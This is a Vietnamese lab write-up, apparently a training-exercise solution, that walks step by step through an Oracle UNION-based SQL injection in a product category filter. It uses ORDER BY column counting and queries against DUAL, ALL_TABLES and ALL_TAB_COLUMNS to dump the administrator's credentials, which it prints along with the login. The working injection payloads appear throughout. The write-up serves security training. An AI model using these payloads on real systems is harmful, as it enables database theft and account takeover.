[lab6.md](https://github.com/user-attachments/files/23074451/lab6.md)
Câu 6 SQL injection attack, listing the database contents on Oracle

Mô tả bài lab: khai thác lỗ hổng SQL injection ở bộ lọc category để truy
vấn và hiển thị username và password của administrator từ một bảng chưa
biết tên và cột chứa username, password. Đăng nhập bằng tài khoảng
administrator là hoàn thành bài lab

Bước 1: Xác định web có lỗ hỏng SQL injection hay không

Chọn category bất kỳ và thêm ký tự \' vào cuối URL, nếu như có thông báo
lỗi internal server error thì có tồn tại lỗ hỏng SQL injection

![A screenshot of a computer AI-generated content may be
incorrect.](image/image1.png){width="6.260416666666667in"
height="1.46875in"}

Bước 2: Xác định có thể khai thác web bằng SQL injection UNION được
không

Nếu như ta chỉnh sửa URL sao cho category=any_string , nếu nhập URL đã
chỉnh sửa mà trang web hiển thị any_string thì ta xác định có thể khai
thác bằng SQL injection UNION

![A screen shot of a computer AI-generated content may be
incorrect.](image/image2.png){width="6.260416666666667in"
height="2.5833333333333335in"}

Bước 3: Ta đi tìm tên của bảng chứa username và password

Bảng ALL_TABLES có cột TABLE_NAME chứa tên của tất cả các bảng, cột có
kiểu dữ liệu là string (VARCHAR2(128))

Ta cần payload union để ghép thành một bảng mới có chứa thông tin của
cột TABLE_NAME

Bắt đầu bằng việc dò số lượng cột của bảng category, \' order by n\--
(encode \'+order+by+n\--)  tăng dần n đến khi gắp lỗi, n=3 thì gặp lỗi
internal server error. Vậy bảng category có 2 cột

![A screenshot of a computer AI-generated content may be
incorrect.](image/image3.png){width="6.260416666666667in"
height="1.5in"}

Bây giờ ta đi tìm trong hai cột của bảng category xem có cột nào kiểu
string không, thực ra thì ta nhìn vào tên sản phẩm và mô tả cũng đủ biết
đó là string, nhưng mà cứ viết payload dò đi cho chắc ăn

\' union select \'a\',\'a\' from dual\-- encode
\'+union+select+\'a\',\'a\'+from+dual\--

Trong Oracle, câu lệnh SELECT bắt buộc phải có mệnh đề FROM. Tuy nhiên
một số truy vấn không cần bất kỳ bảng nào như truy vấn được dùng làm
payload trong lab này. Oracle đã tạo sẵn cho ta một bảng dummy tên là
DUAL dùng cho mệnh đề FROM. Bằng cách sử dụng bảng DUAL, ta có thể thực
hiện các truy vấn chứa các hàm không liên quan đến bất kỳ bảng nào

![A screenshot of a computer AI-generated content may be
incorrect.](image/image4.png){width="6.260416666666667in"
height="3.1770833333333335in"}

Tới đây là đủ biết cả hai cột đều là string

Giờ ta sẽ tạo payload union để ghép thành bảng chứa thông tin cột
TABLE_NAME

\' union select TABLE_NAME,NULL from ALL_TABLES\--

encode

\'+union+select+TABLE_NAME,NULL+from+ALL_TABLES\--

![A screenshot of a computer AI-generated content may be
incorrect.](image/image5.png){width="6.260416666666667in"
height="3.2083333333333335in"}

Cột TABLE_NAME có khá nhiều giá trị nên chụp ảnh không hết, giờ copy hết
giá trị rồi quăng lên đây cho dễ nhìn

**APP_ROLE_MEMBERSHIP**

**APP_USERS_AND_ROLES**

AUDIT_ACTIONS

DR\$NUMBER_SEQUENCE

DR\$OBJECT_ATTRIBUTE

DR\$POLICY_TAB

DR\$THS

DR\$THS_PHRASE

DUAL

HELP

HS\$\_PARALLEL_METADATA

HS_BULKLOAD_VIEW_OBJ

HS_PARTITION_COL_NAME

HS_PARTITION_COL_TYPE

IMPDP_STATS

KU\$NOEXP_TAB

KU\$\_DATAPUMP_MASTER_10_1

KU\$\_DATAPUMP_MASTER_11_1

KU\$\_DATAPUMP_MASTER_11_1_0_7

KU\$\_DATAPUMP_MASTER_11_2

KU\$\_LIST_FILTER_TEMP

KU\$\_LIST_FILTER_TEMP_2

NTV2_XML_DATA

ODCI_PMO_ROWIDS\$

ODCI_SECOBJ\$

ODCI_WARNINGS\$

OGIS_GEOMETRY_COLUMNS

OGIS_SPATIAL_REFERENCE_SYSTEMS

OL\$

OL\$HINTS

OL\$NODES

PLAN_TABLE\$

PRODUCTS

PSTUBTBL

SDO_COORD_AXES

SDO_COORD_AXIS_NAMES

SDO_COORD_OPS

SDO_COORD_OP_METHODS

SDO_COORD_OP_PARAMS

SDO_COORD_OP_PARAM_USE

SDO_COORD_OP_PARAM_VALS

SDO_COORD_OP_PATHS

SDO_COORD_REF_SYS

SDO_COORD_SYS

SDO_CRS_GEOGRAPHIC_PLUS_HEIGHT

SDO_CS_CONTEXT_INFORMATION

SDO_CS_SRS

SDO_DATUMS

SDO_DATUMS_OLD_SNAPSHOT

SDO_ELLIPSOIDS

SDO_ELLIPSOIDS_OLD_SNAPSHOT

SDO_PREFERRED_OPS_SYSTEM

SDO_PREFERRED_OPS_USER

SDO_PRIME_MERIDIANS

SDO_PROJECTIONS_OLD_SNAPSHOT

SDO_ST_TOLERANCE

SDO_TOPO_DATA\$

SDO_TOPO_RELATION_DATA

SDO_TOPO_TRANSACT_DATA

SDO_TXN_IDX_DELETES

SDO_TXN_IDX_EXP_UPD_RGN

SDO_TXN_IDX_INSERTS

SDO_UNITS_OF_MEASURE

SDO_XML_SCHEMAS

SRSNAMESPACE_TABLE

STMT_AUDIT_OPTION_MAP

SYSTEM_PRIVILEGE_MAP

TABLE_PRIVILEGE_MAP

**USERS_KNNNGC**

WRI\$\_ADV_ASA_RECO_DATA

WRR\$\_REPLAY_CALL_FILTER

WWV_FLOW_DUAL100

WWV_FLOW_LOV_TEMP

WWV_FLOW_TEMP_TABLE

XDB\$XIDX_IMP_T

Dựa vào kinh nghiệm thì ta có thể thấy vài bảng có khả năng khai thác
được username và password của administrator như **APP_USERS_AND_ROLES,
APP_ROLE_MEMBERSHIP, USERS_KNNNGC**

Tạm thời ta thử chọn **APP_USERS_AND_ROLES** để khai thác trước

Bước 4: Thực hiện khai thác username và password từ bảng đã chọn

Để lấy được thông tin cần từ bảng thì ta cần tên của cột chứa thông tin

Bảng ALL_TAB_COLUMNS có cột COLUMN_NAME chứa tên của các cột trong bảng
tương ứng với cột TABLE_NAME, cả hai cột đều là kiểu string. Giờ ta cần
tạo payload khai thác tên của các cột trong bảng **APP_USERS_AND_ROLES**

\' union select COLUMN_NAME,NULL from ALL_TAB_COLUMNS where TABLE_NAME =
\'**APP_USERS_AND_ROLES\'**\--

encode

\'+union+select+COLUMN_NAME,NULL+from+ALL_TAB_COLUMNS+where+TABLE_NAME+=+\'**APP_USERS_AND_ROLES\'**\--

![A screen shot of a computer AI-generated content may be
incorrect.](image/image6.png){width="6.260416666666667in"
height="1.5416666666666667in"}

Dùng payload trên thì có lỗi, tức là đây không phải bản đúng, thử bảng
**APP_ROLE_MEMBERSHIP**

\'+union+select+COLUMN_NAME,NULL+from+ALL_TAB_COLUMNS+where+TABLE_NAME+=+\'**APP_ROLE_MEMBERSHIP\'**\--

Bảng  **APP_ROLE_MEMBERSHIP** cũng gặp lỗi

Thử bảng cuối cùng **USERS_KNNNGC**

\'+union+select+COLUMN_NAME,NULL+from+ALL_TAB_COLUMNS+where+TABLE_NAME+=+\'**USERS_KNNNGC\'**\--

![A screenshot of a computer AI-generated content may be
incorrect.](image/image7.png){width="6.270833333333333in"
height="3.1770833333333335in"}

Ta khai thác được bảng gồm các cột sau: EMAIL, PASSWORD_HADASO,
USERNAME_UFIRSY

Bước 5: Ta đã có đầy đủ các thành phần, giờ chỉ cần payload khai thác
tài khoảng và mật khẩu của administrator sau đó đăng nhập vào tài khoảng
là xong

\' union select USERNAME_UFIRSY,PASSWORD_HADASO from USERS_KNNNGC\--

encode

\'+union+select+USERNAME_UFIRSY,PASSWORD_HADASO+from+USERS_KNNNGC\--

![A screenshot of a computer AI-generated content may be
incorrect.](image/image8.png){width="6.270833333333333in"
height="2.8854166666666665in"}

![A white background with black lines AI-generated content may be
incorrect.](image/image9.png){width="6.270833333333333in"
height="0.9166666666666666in"}

Ta khai thác được tài khoảng của administrator như sau

username:administrator, password: qraw1uzjh8vjue12y6c4

Tiến hành đăng nhập

![A screenshot of a computer AI-generated content may be
incorrect.](image/image10.png){width="6.270833333333333in"
height="3.2083333333333335in"}
